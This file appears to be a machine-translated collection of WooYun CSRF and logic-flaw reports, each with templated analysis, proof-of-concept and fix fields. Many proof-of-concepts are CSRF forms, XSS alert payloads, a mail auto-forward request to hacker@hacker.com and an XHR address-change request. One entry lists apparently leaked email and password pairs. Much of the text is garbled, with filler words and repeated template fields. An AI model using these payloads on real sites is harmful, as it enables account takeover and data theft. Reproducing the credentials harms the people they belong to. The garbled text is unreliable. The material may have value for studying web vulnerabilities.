### [wooyun-2010-0102] a certain search enginea systemlog inpagecross-siteandCSRF vulnerability
**Vendor**: a certain search engine | **Year**: 2010 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: https://example.com/[redacted]"/><script>alert(/liscker/);</script>&username=xxhttps://example.com/[redacted]"/><script>alert(/liscker/);</script>POST /report/accounts/checkLogin HTTP/1.1Host: data.baidu.comAccept: */*Referer

**Bypass**: Direct exploitation

**Fix**: filtercross-sitetranslated textvariablevalidationcode
---

---
### [wooyun-2014-064882] Discuz CSRFdeletetranslated text
**Vendor**: Discuz! | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: admin_group.php} elseif($operation == 'deletetype') {//novalidationfromhashcausingcancsrfdelete$fid = $_GET['fid'];$ajax = $_GET['ajax'];$confirmed = $_GET['confirmed'];$finished = $_GET['finished'];$total = intval($_GET['total']);$pp = intval($_GET['pp']);$currow = intval($_GET['currow']);if($ajax) {ob_end_clean();require_once libfile('function/post');$tids = array();foreach(C::t('forum_thread')->fetch_all_by_fid(

**POC**: translated textfunctionalityafterpostaddoneimgtext imagetexthttp://[IP redacted] cantextoneunder then candeletealltext

**Bypass**: Direct exploitation

**Fix**: fromhashvalidation
---

---
### [wooyun-2010-0584] apachetextconfigurationfilecausinghasjsonhijack
**Vendor**: apache | **Year**: 2010 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textconfigurationundercgi-bin/printenvorcgi-bin/printenv.cgi printenv.plreturndataHTTPtextistxt,buttextforreturndatadatabasetextjsonformat,cancancausingjsonhijack,thisdatanottexthttponlytext

**POC**: dork: inurl:cgi-bin/printenv<script src=https://example.com/[redacted])</script>translated texthastextCOOKIEtextline,text

**Bypass**: Direct exploitation

**Fix**: rm -rf ,nottranslated text....
---

---
### [wooyun-2015-0119684] translated textvulnerabilitysmall package
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: CSRF vulnerability,inmodifyprofilelocation.insavetextlocationcapture packets,requestdataIthennottexton,textallisplaintext.SCRF POCcode is as follows:<html><head><title>Csrf Poc</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="nick" value="cnhackers"><input type="hidden" name="sex" value="1"><input type="hidden" name="age"

**Bypass**: Direct exploitation

**Fix**: addtokenorotherauthentication.texthasthenisrequestthatsomevaluerecommendencryptoneunder,textallisplaintext.rewardintextinsidetext!
---

---
### [wooyun-2015-0127934] hastextCSRFallsiteshipping addressarbitrarydelete(textaccountdata)
**Vendor**: picooc.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="receiver" value="decode error#152;&#191;decode error#137;&#147;decode error#174;&#151;decode error#137;&#147;" /><input type="hidden" name="province" value="decode error#164;&#169;decode error#180;&#165;" /><input type="hidden" name="city" value="decode error#178;&#179;decode error

**POC**: translated text peopletextshipping address..

**Bypass**: Direct exploitation

**Fix**: you know what to do
---

---
### [wooyun-2016-0169000] pointIlinkIthencancanwillentertexta certain video siteaccount
**Vendor**: a certain video site.com | **Year**: 2016 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection, authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: ina certain video siteon,useristextbinda certain social platformlog in,textbindinterfaceiscanCSRF,textthenistextwhenuserlog inafter,clickIlink,Ithencancallthisinterfacetextbind,bindafterthencanuseIusea certain social platformenterlinelog in.textinterfaceas follows:https://example.com/[redacted] textonea certain social platform,thenusea certain social platformtranslated texta certain video site.translated textisintextvulnerabilityinalreadytexttotext,heretextuseandmodifyoneunder:"a certain social platforma certain social platformtexthasas followstextpoint,ifwhentextlog ina certain social platformtranslated texta certain video site,thattextthenwilltextbindsuccess"0x02 useonetextiframeinuserbrowseronlog inwespecifieda certain social platform.hereusetointerfacehas peopleissueneedtext,thenisrequestParametersinpassword_4555andvk=4555_a3b5_1907935541,these twoParametersisinhttp://l

**POC**: IdirectlytextItext peopleoneflaskprogram,textflaskandbeautifulsoup,thennotinIselftextontexttestenvironment.$ pip install flask beautifulsoup && python server.pyserver.py,selftextoneunderweibo_usernameandweibo_password.# -*- coding: utf-8 -*-import requestsimport refrom flask import Flaskfrom BeautifulSoup import BeautifulSoupapp = Flask(__name__)login_weibo_fo

**Bypass**: Direct exploitation

**Fix**: FixbindinterfaceCSRF.
---

---
### [wooyun-2012-08367] translated textundera certain siteCSRFtextpacket
**Vendor**: translated text | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptPOSTandGETinformationwhen,notforPOSTsource(Referer)verify,also does notinPOSTinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.

**POC**: [No.one location]vulnerabilityaddress:https://example.com/[redacted] id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="tid" value="" /><input type="text" name="content" value="XX" /><input type="text" name="secret" value="0" /><input type="text" name="

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceRefererinPOSTinformation add to token
---

---
### [wooyun-2015-0110095] textone locationcanbeusefortextdatabase(textvalidationcanlog in)
**Vendor**: translated text | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textlargetextinzonecommunitypublishonetranslated text textcometestoneunder effecttextwhennottextfordatatext thentextonedatabasesenterlinetest successtextnumber14translated textlog ininterfacecanbeusefortextdatabase textvalidationcanlog inPOST /sign_in/?success=https%3A%2F%2Faccount.guokr.com%2Foauth2%2Fauthorize%2F%3Fclient_id%3D32353%26redirect_uri%3Dhttp%253A%252F%252Fwww.guokr.com%252Fsso%252F%253Flazy%253Dy%2526rid%253D691603653%2526success%253Dhttp%25253A%25252F%25252Fwww.guokr.com%25252F%26response_type%3Dcode%26state%3De9c1fee646be06a781a33d44a9

**POC**: littlefaith@126.com----f298731227injuin@a certain email.com----zl810315ricky_eternal@a certain email.com----7uko098iqimu819@a certain email.com----1992819zy350346350@some-domain.com----5059758a444589012@some-domain.com----wo58835303517965249@some-domain.com----517965249550188534@some-domain.com----zxcv123ssaleey@126.com----ss41913612yooo123321@a certain email.com----yt1994518278732

**Bypass**: Direct exploitation

**Fix**: addvalidationcode,restrictionaccounttrytext timestext
---

---
### [wooyun-2011-02157] a certain social platformone locationrefererrestrictionnottextcsrfpostvulnerability
**Vendor**: a certain Internet company | **Year**: 2011 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain social platformone locationcsrfpostvulnerability,refererrestrictionnottext,cantextworm

**POC**: onetextforwarda certain social platformtext,textsourcetextashttps://example.com/[redacted] action="https://example.com/[redacted]" method="post" name="myform" id="myform"><input type="hidden" name="content" value="thistranslated textgoodtext https://example.com/[redacted] <?php echo rand(1,1000000);?>"/><input type="hidden" name="url" value="http

**Bypass**: Direct exploitation

**Fix**: refererfiltertextpoint
---

---
### [wooyun-2014-048935] a certain game companybrowser gameplatformcanthroughCSRFpasswordtextissue+passwordrecoverresetpassword
**Vendor**: 52xinyou.cn | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: do not knowtextnottranslated textcopycometextpasswordrecoverhasnoissue,methodthenistwotext,bindemailandthroughpasswordtextissue.emailif,translated textissue,thenpasswordtextissueif,triedoneunder,textpasswordtextissue,willtextpasswordtranslated text,nottextpasswordtextissue,textwillhastranslated text,thenthentext,translated textsetpasswordtextissue,thattextIcancannottranslated textsettext,thenIinexploitsetpasswordtextissueandtextrecover?foristhenthis way.setsuccesstext,thiscsrftextfornotsetpasswordissueuser.throughCSRF vulnerability,wethentranslated textsettextpasswordtext.thenwetextpasswordrecoverthatinside,textpasswordtextissuethenresetpassword.

**POC**: do not knowtextnottranslated textcopycometextpasswordrecoverhasnoissue,methodthenistwotext,bindemailandthroughpasswordtextissue.emailif,translated textissue,thenpasswordtextissueif,triedoneunder,textpasswordtextissue,willtextpasswordtranslated text,nottextpasswordtextissue,textwillhastranslated text,thenthentext,translated textsetpasswordtextissue,thattextIcancannottranslated textsettext,thenIinexploitsetpasswordtextissueandtextrecover?foristhenthis way.setsuccesstext,thiscsrftextfornotsetpasswordissueuser.throughCSRF vulnerability,wethentranslated textsettextpasswordtext.thenwetextpasswordrecoverthatinside,textpasswordtextissuethenresetpassword.

**Bypass**: Direct exploitation

**Fix**: Itextalltranslated textlargetext.
---

---
### [wooyun-2012-08514] a certain social platforma certain social platformone locationCSRF vulnerability
**Vendor**: a certain social platform | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptPOSTandGETinformationwhen,notforPOSTsource(Referer)verify,also does notinPOSTinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.

**POC**: vulnerabilityaddress:https://example.com/[redacted] id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="poll_id" value="1742981" /><input type="text" name="content" value="XXXXXXXXXXX" /><input type="text" name="is_first" value="0"

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceRefererinPOSTinformation add to token
---

---
### [wooyun-2014-086193] a certain communicationsVendortextfanstranslated textwebsitehasCSRF
**Vendor**: a certain communications equipment vendor | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain communicationsVendor textfanstranslated text websitehasCSRFcn.club.vmall.com

**POC**: 1.textonetextfanstranslated textwebsiteaccount,textsend peoplepost,2.putpostPOSTrequesttextnext,foundnodefenseCSRFtoken3.CSRFtranslated texthastokenandreferer.textthis,textneedforrefererenterlinetest.texttest,foundmodifyasitstextwebsite(text:a certain search engine)text,postsendtextfailed4.modifyastext,postsendtextsuccess.5.textafter,constructtextsubmitCSRF PoC6.victim hostclickafter,postsuccesspublish

**Bypass**: Direct exploitation

**Fix**: translated text ^_^
---

---
### [wooyun-2012-016117] a certain mobile phoneforumhasCSRF vulnerability
**Vendor**: a certain mobile phoneVendor | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: text:a certain mobile phoneVendormobile phonecopytexthasflymeremoteaccount,useforstoretranslated text,SMSetc.privateinformation.textheart:forumtextaftercanuseflymeaccountpasswordlog inforum.self-assessed:personaltextvulnerabilityetc.text:text.textinforusertranslated textuseandprivateSMStext,andtextcanoperationflymetranslated text,remotetextmobile phoneetc.functionality.texthastextoperationcanExecutiontextmodifyCSStextetc.operation.notoneonetext.

**POC**: text:a certain mobile phoneVendormobile phonecopytexthasflymeremoteaccount,useforstoretranslated text,SMSetc.privateinformation.textheart:forumtextaftercanuseflymeaccountpasswordlog inforum.self-assessed:personaltextvulnerabilityetc.text:text.textinforusertranslated textuseandprivateSMStext,andtextcanoperationflymetranslated text,remotetextmobile phoneetc.functionality.text:undertranslated textlinkinusec.cntextascopytexthostdomain name translated textselfmodifyJScalldomain nameetc.informationtextoneasIEunderremoteJScall,candirectlytextpagelink:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: CSRFItexta certain mobile phoneVendorcanFix.
---

---
### [wooyun-2012-06536] wooyun CSRF vulnerability
**Vendor**: Wooyun | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifytranslated textno token

**POC**: <meta charset=utf-8 ><form action="//www.wooyun.org/user.php?action=update&amp;do=editinfo" method="POST"><div class="infoContent block"><table class="formTable"><tbody><tr><th width="100">personalhomepage:</th><td><input type="text" name="homepage" ></td></tr><tr><th valign="top">personaltext:</th><td><textarea rows="

**Bypass**: Direct exploitation

**Fix**: textisnottext
---

---
### [wooyun-2011-02088] a certain emailserviceCSRF vulnerability
**Vendor**: a certain Internet company | **Year**: 2011 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain emailservicehas peopletextlargefunctionalitytext"textforward",thenthisfunctionalitynotextCSRFtext.look atlook atsetforwardhttppacket:GET /autofw/fwto.do?sid=XXXXXXXXXXXXXXXXXXXXXXXXX&forwarddes=hacker@hacker.com&keeplocal=1&callback=MM.autofwd.valCallback HTTP/1.1Host: config.mail.126.comReferer: https://example.com/[redacted] Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/[IP redacted] Safari/534.24Acc

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: you know what to do.
---

---
### [wooyun-2015-0121415] Fanhuan.comCSRF vulnerabilityone issue(arbitrarychangeshipping address)
**Vendor**: Fanhuan.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textwecomecapture packetslook atundershipping addressweconstructunderpocthencan,onlyneedonetextimagethen can,imagetextquestionwilltextsendtextrequesttextaddtextOK wetextquestionunder,thenwillfoundalreadychangealreadytesttwo peopleaccount allcanCSRFaddress

**POC**: OK wetextquestionunder,thenwillfoundalreadychange

**Bypass**: Direct exploitation

**Fix**: addvalidationthen can
---

---
### [wooyun-2015-0118767] namedtextdatabasetextCSRFsmall package
**Vendor**: namedtextdatabasenetworktexthastextcompany | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: modifypersonalinformationnoaddtextvalidation.submitted dataIthennottexton,textinweconstructoneform,code is as follows:<html><head><title>poc</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="name" value="wooyun"><input type="hidden" name="sex" value="2"><input type="hidden" name="_DTYPE_DATE%5B%5D" value="birt

**Bypass**: Direct exploitation

**Fix**: addtokenorothervalidation
---

---
### [wooyun-2014-086465] translated textoflook atItextunlimitedboost followers
**Vendor**: translated text | **Year**: 2014 | **Type**: csrf

**Meta-thinking**: Trigger signal: functional testing

**Insight**: csrf lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify csrf-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: text..textoneonlytranslated texthttps://example.com/[redacted] thentextpointfollowtextpacket,,,as shownGettype..so easy hasrefer  inaftertextadd  ".xxxx" Bypass...!!textCopy url:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: filterBypass

**Fix**: translated text..refer thatinside..oraddtoken..thenthis way..youtextItext
---

---
### [wooyun-2015-090935] a certain emailservicetexttokenrestrictionCSRFsetarbitrarytext
**Vendor**: a certain Internet company | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: weusetextadmin backendCSRFneedtextfortextisadmin backendoperationaddtoken,thenunable toconstruct.thistextthencantextthistext,throughreferercometexttoken / sid after,exploitheadertranslated text,translated textCSRF.texttocopyCase,a certain emailservicethisexploittranslated textfortwo peopletextpoint:1 useremoteimagecomeobtainreferer,ina certain Internet companyemailinimage,refererwilltexthastranslated textsid2 useSIDGETcommandcometranslated text,textexecute specifiedcontent.throughonetextsinglescriptputuseontwopointtextcreatetranslated textExecutionfunctionality.thistextsametranslated texttokeninlinkinprogram,for examplewapa certain Internet company,useandlargetextmobile phonetextuse.operationtext:putwithaddcodetexthaswebsiteon,texttargetvictimsendtextonetextcontenttextemail,throughtextimagefunctionalitycallthislink.whenvictimchecklook atimagewhen,triggerCSRF,willadmin backendtextaddtextonetranslated text.textprogramcode,3textafterparttextundertextpopup,sametextintextemailtextintranslated text.thisparttextcontentnottextcantext

**POC**: textsendtextonetextemail,victimchecklook atemailisthis way:thistextalreadytext,3textafter,victimdesktoptextundertextwillparttextemailtext:click to opentextcontentisthis way,nottranslated textfiltertextrestriction:sametranslated textinemailtextinistranslated text:

**Bypass**: Direct exploitation

**Fix**: just xss it.
---

---
### [wooyun-2014-077959] translated textAPPone locationtextpermissionsissue
**Vendor**: yaofang.cn | **Year**: 2014 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: addressmodifytextinsavetextputuseridmodifytextotheruserIDaftercanputaddresssavetootheruser.andtextthistexthasCSRF,cantextputaddresssavetoothertextinside,translated text,text.textasonesecurityissue,translated text.addressmodifytext:user188mobile phonelog in,userid:2988294user156mobile phonelog in,userid:2988309user156inmodifyaddresstextputuseridtext188uservaluemodifytextmodifyaftersuccessuser188mobile phonelog intext,addresstraversal...

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: savetextforuseridverify,addtranslated textvalidationtoken.
---

---
### [wooyun-2013-020417] Renrentextfeedinimagecanarbitrarymodifyvulnerability
**Vendor**: Renren | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inthis,Itranslated textonetext:userclickunderforURLtextassuccesstexta certain friendtextaddtexthttps://example.com/[redacted] "translated textSOS App -translated text",URLas https://example.com/[redacted] https://example.com/[redacted] inputvideoURL,thenwillhasparttext,as shown below,textusertranslated texthandletextthistextuse firebug ,modifytextform putpicfieldchangeasattacktarget,thentextlargetranslated text,texthomepagelook atlook atthis wayonlytextfriendopentranslated texthomepage textastext

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: directlyobtainimage
---

---
### [wooyun-2014-069792] translated textcsrfvulnerabilitycanthroughtextemailcometextpassword
**Vendor**: translated text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: texttopostrequestas follows:uasusertextnumber,vasmodifyemail,thisusertextnumberintranslated texthomepageiscanget,requestinstextnumbertranslated textbuttriedundertranslated textuse.

**POC**: return2shouldistext,textemailtexttotext..emailmodifysuccess,textnotextSMStext,quietly.undertextthencanlog inwhenclickunicode-2019textpassword,2019=>

**Bypass**: Direct exploitation

**Fix**: thisnotshouldgetrequestcontrol
---

---
### [wooyun-2015-093225] textenterpriseportal system v3.3csrfmodifyadministratorpassword
**Vendor**: chanzhi.org | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textenterpriseportal system v3.3latest versioncopy hascsrfvulnerabilitytextItestwhenfound,textmodifypassword,administratortextnotwillimmediatelyneedtextlog in,socoordinateItranslated text,cantexttotextnottextnottextmodifyitsmanagementpasswordtextnext,Ithencometranslated textvulnerabilitytext

**POC**: 1,weenteradmin backend,foundnoaddadministrator,thattextwecometryoneundermodifyadministratorpasswordtexthastext,wefoundmodifyadministratorpassword,notneedvalidationtextpassword~~~goodtranslated text!thatweagaincomecapture packetstruncationlook atlook athasnotokenoftextvalidation2,useburpsuitetruncationItranslated textalltext hastexthas??novalidation,thentwo peoplepassword3,constructform!<html><body><form id="post123" name="post123" action="http://[IP redacted] method="POST"><input type="hidden" name="passwo

**Bypass**: Direct exploitation

**Fix**: textismodifypasswordhere,addonetextpasswordvalidation,texthasthenisaddtokenvalidation,defensecsrfattack!
---

---
### [wooyun-2014-051104] exploitcsrfvulnerabilitytranslated textothertextQtext
**Vendor**: a certain Internet company | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: injifen.some-domain.com  insidetext text severaltextpointsaddQtext  Itextonetexthttps://example.com/[redacted] translated text9 peopleQtranslated textbecauseInoQtextthenbalancenottextinputtranslated textnexthttps://example.com/[redacted]  onetranslated textthispagelook atnottext  translated textwillpointtranslated textenteraftertranslated text9 peopleQtext     textwillgetonetranslated text  hassufficientQtext  andpoints    onetextgameuserallwillhas.translated text

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: do not knowtext  textinpointstextthatinside
---

---
### [wooyun-2013-040552] a certain social platformcsrfvulnerabilityarbitraryboost followers
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: text,hereaddfansinterfaceuseisgetmethod.this wayprogramtextthistranslated text tjjtds .https://example.com/[redacted]  herefollow/add followinterfaceusetexta certain social platformas an example,exploitlinkhttps://example.com/[redacted] https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: modifyaspostmethod.
---

---
### [wooyun-2015-0133359] csrf constructtextcantextmodifypassword
**Vendor**: efly.cc | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: https://example.com/[redacted] passwordthenwilltranslated text123456interfacetextaddvalidation

**Bypass**: Direct exploitation

**Fix**: textItext
---

---
### [wooyun-2015-0126946] translated textshipping addresshascsrf
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifyshipping address,look atpacketmodifysuccess:itsinaddr_idastextvalue,nonotcantextParameters,constructcsrflinkxmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("addr_id=86261&receiver=woo126sss&province=%E5%8C%97%E4%BA%AC%E5%B8%82&city=%E4%B8%9C%E5%9F%8E%E5%8C%BA&town=%E4%BA%8C%E7%8E%AF%E5%86%85&address=fszhfdzh&postcode=100005&m

**POC**: Same as aboverequesting a reward...

**Bypass**: Direct exploitation

**Fix**: validationrefereraddtoken
---

---
### [wooyun-2013-044633] a certain video sitetextundertextdreamcsrf(canfollow,cancel,modifytextname)
**Vendor**: a certain video site | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: null
---

---
### [wooyun-2014-080615] textCMS 7.0latest versionCSRF vulnerability2text
**Vendor**: textCMS | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: No.one issue:CSRFaddpersonalinformationaddressvulnerabilityURLhttp://[IP redacted] textinmessagetext2 deletemessagecapture packetsrequestas follows,directlyis justGET3 thentextfornotoken,socanconstructCSRFdeletemessage.exploitURL http://[IP redacted]

**POC**: as above

**Bypass**: Direct exploitation

**Fix**: addtokenvalidation
---

---
### [wooyun-2014-065028] translated texthasvulnerability,log inaftercanqueryothertranslated textlarge amount oftextinformation.
**Vendor**: szsi.gov.cn | **Year**: 2014 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: itstextthisissuein2009textwhen,Ithenfound.whentextItranslated textaddtranslated text,Ilog inwebsitequeryItranslated textinformation.textfortranslated text,look attotext,thentextmodifytextintranslated textcomputernumber,textcanqueryothertranslated textinformation,whentextuseaswilltranslated text,canisthistranslated text,textis onetext.......changetextinGRCODE:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0115931] translated textCSRF vulnerabilityresetarbitraryaccount
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.itstextthistextisthis way,textintranslated text,inetc.textreplywhentestoneunder2.forisgetundertextthislink:https://example.com/[redacted]

**POC**: 1.forisgetundertextthislink:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: cantryadd avalidationcodeortokenvalidation
---

---
### [wooyun-2013-035628] a certain search enginea subsitecsrfvulnerabilitycanboost followers
**Vendor**: a certain search engine | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: one,a certain search enginetranslated textfollowthisgirlhttps://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: textrefersource,orpostandcookie add to tokenenterlinetext
---

---
### [wooyun-2015-0106076] Nationalinformationsecurityvulnerabilitytextplatforma certain functional design flaw causescross-siterequest forgery(CSRF)
**Vendor**: Nationalinformationsecurityvulnerabilitytextplatform(CNVD) | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Nationalinformationsecurityvulnerabilitytextplatforma certain functional design flaw causescross-siterequest forgery(CSRF)

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: 1.CAPTCHA is considered a defense againstCSRFattacks and the simplest effective defensive method.2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2013-036936] Aili.comCSRFarbitrarymodifytranslated textinformation
**Vendor**: aili.com | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: triedunderAili.comtextmodifypasswordhasrestrictionoftext,othermodifyinformationallisdirectlyGET,this waytextcausingimpacttextlarge.textseveralpackettext:https://example.com/[redacted] payload translated textimagepublishtoAili.comtextcantranslated text,(textblog,or

**POC**: whenusertextquestionafter,textbemalicioustext

**Bypass**: Direct exploitation

**Fix**: requesting a reward
---

---
### [wooyun-2016-0171499] a certain social platforma certain social platformJSONPhijackofpointIlinkstarta certain social platformworm+boost followers
**Vendor**: a certain social platform | **Year**: 2016 | **Type**: CSRF

